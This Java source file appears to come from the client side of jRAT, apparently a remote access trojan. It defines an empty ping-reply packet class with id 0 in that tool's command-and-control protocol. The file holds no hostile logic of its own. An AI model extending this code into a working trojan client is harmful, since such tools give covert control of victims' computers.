package jrat.client.packets.outgoing;

import jrat.client.Connection;

public class Packet0PingReply implements OutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {

	}

	@Override
	public short getPacketId() {
		return (byte) 0;
	}

}
